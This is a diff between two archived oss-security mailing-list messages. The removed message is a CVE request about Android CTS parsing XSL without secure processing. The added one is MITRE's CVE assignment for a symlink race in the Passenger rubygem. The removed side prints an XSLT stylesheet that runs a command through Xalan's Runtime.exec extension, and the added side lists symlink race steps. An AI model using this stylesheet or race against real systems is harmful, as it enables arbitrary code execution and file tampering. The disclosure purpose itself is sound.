@@ -1,70 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/19/6
-Message-ID: <CAGGN9efWYTCWzBg1gtzAEsE13oSq2SAe+9kGch3d_kUXP2coMg@mail.gmail.com>
-Date: Mon, 20 Oct 2014 08:29:16 +1000
-From: Lord Tuskington <l.tuskington@...il.com>
-To: Full Disclosure List <fulldisclosure@...lists.org>, oss-security@...ts.openwall.com
-Subject: Re: CVE request: remote code execution in Android CTS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/30/3
+Message-Id: <201401301426.s0UEQXJY027363@linus.mitre.org>
+Date: Thu, 30 Jan 2014 09:26:33 -0500 (EST)
+From: cve-assign@...re.org
+To: vdanen@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, geissert@...ian.org, support@...sion.nl, jwilk@...ian.org, 736958@...s.debian.org
+Subject: Re: CVE request: temporary file issue in Passenger rubygem
 Content-Type: text/plain; charset=utf-8
 
-I disagree with Nick Kralevich's response. An attacker who has the ability
-to locally modify an XSL file should not be able to leverage this to
-achieve code execution. This crosses a trust boundary.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-As for why I didn't report this to security@...roid.com, when Google starts
-paying corporate tax instead of dodging it, I will report issues privately.
+> If a local attacker can predict this filename, and precreates a
+> symlink with the same filename that points to an arbitrary directory
+> with mode 755, owner root and group root, then the attacker will
+> succeed in making Phusion Passenger write files and create
+> subdirectories inside that target directory.
+> 
+> It is fixed in upstream version 4.0.33.
+> 
+> https://github.com/phusion/passenger/commit/34b1087870c2bf85ebfd72c30b78577e10ab9744
 
-Lord Tuskington
-Chief Financial Taxdodger
-Google
+> One thing to notice, however, is that there's a race condition between
+> the stat check introduced in 34b1087870c2.
+> The following sequence still triggers the bogus behaviour:
+> 
+> <user> mkdir $dir
+> <phusion> lstat() (getFileTypeNoFollowSymlinks)
+> <user> rmdir $dir
+> <user> ln -s /target $dir
+> <phusion> stat() (from verifyDirectoryPermissions)
 
-On Sun, Oct 19, 2014 at 7:28 PM, Lord Tuskington <l.tuskington@...il.com>
-wrote:
+> Upstream has now fixed this with the following commit (basically using
+> the structure from lstat() for the two checks):
+> https://github.com/phusion/passenger/commit/94428057c602da3d6d34ef75c78091066ecac5c0
 
-> CTS parses api-coverage.xsl without providing the
-> FEATURE_SECURE_PROCESSING option. See lines 60-67 of
-> cts/tools/cts-api-coverage/src/com/android/cts/apicoverage/HtmlReport.java:
->
-> InputStream xsl =
-> CtsApiCoverage.class.getResourceAsStream("/api-coverage.xsl");
-> StreamSource xslSource = new StreamSource(xsl);
-> TransformerFactory factory = TransformerFactory.newInstance();
-> Transformer transformer = factory.newTransformer(xslSource);
->
-> StreamSource xmlSource = new StreamSource(xmlIn);
-> StreamResult result = new StreamResult(out);
-> transformer.transform(xmlSource, result);
->
-> An attacker who is able to control api-coverage.xsl could inject arbitrary
-> code into it, which would be executed. For example:
->
-> <xsl:stylesheet version="1.0"
-> xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-> xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
-> xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
-> >
-> <xsl:output method="text"/>
->     <xsl:template match="/">
->        <xsl:variable name="Command"><![CDATA[calc.exe]]></xsl:variable>
->        <xsl:variable name="RT" select="rt:getRuntime()"/>
->        <xsl:variable name="proc" select="rt:exec($RT, $Command)"/>
->        <xsl:text>Process: </xsl:text><xsl:value-of select="$proc"/>
->     </xsl:template>
-> </xsl:stylesheet>
->
-> Would pop a calc. This crosses a trust boundary because an attacker could
-> provide an XSL stylesheet that, for example, has enhanced visual layout. A
-> person consuming that stylesheet would assume it could not possibly contain
-> arbitrary code that would be executed, as it's just a stylesheet. The XSL
-> extensions to execute code should be disabled by passing
-> FEATURE_SECURE_PROCESSING.
->
-> Regards
->
-> Lord Tuskington
->
-> Chief Financial Pinniped
->
-> TuskCorp
->
+Use CVE-2014-1831 for the vulnerability with the "before 4.0.33"
+affected versions.
 
+Use CVE-2014-1832 for the vulnerability with the "4.0.33 and earlier"
+affected versions.
+
+This is an unusual situation because it depends on a decision about
+whether the fix in version 4.0.33 solves part of the problem or
+addresses one of the threat models. It also depends on whether two
+CVEs should be used to cover a set of reports that are only relevant
+to symlink attacks, but arguably have different flaw types.
+
+CVE-2014-1831 requires the ability to create a symlink but apparently
+does not require the ability to conduct the described race-condition
+attack. The attacker could lack direct shell access, but have some
+type of slow or limited access to the system. This could potentially
+involve the ability to upload and run scripts that can create symlinks
+but can't execute arbitrary commands or code. Alternatively, the
+attacker could have access to a file manager with the same
+constraints.
+
+Also, in some cases, multiple CVEs are used in the case of a single
+original report of a symlink-handling problem, e.g., CVE-2008-1569 and
+CVE-2008-1570.
+
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
+
+iQEcBAEBAgAGBQJS6l9uAAoJEKllVAevmvmsj9oH/RlmH2kO7M1WIIvuD3FlH1SD
+Fe0bqmWlVQRR77Q61IS7trfCd88sSTiyWZAm7g8EJn6Prct6AGAIH1tE0EaPbzm1
+VrCcxPXJh22LPDNv0p+4ug9CjjWLVhj8cHP/T50M5bgRbbj/EKF4CbkHsDxdLtf8
+crpDsvQVTZLS2d2460tCe3gjVk0Ew2bP99PgW0p7NHz4IbbwL2mX/1L0shUqMnkB
+UAJW1YSU1n5sAX37iz49Neyw5ptqrXsFcZNvqyuW5ch+LBnMKg8fcgg6t78ATqBE
+1bw1HMSPyXhmmajk1ED/+8qc4+wMe0/iqItiVQQTO/JqL3qMGr+1rmGbLkPH43U=
+=5HHG
+-----END PGP SIGNATURE-----
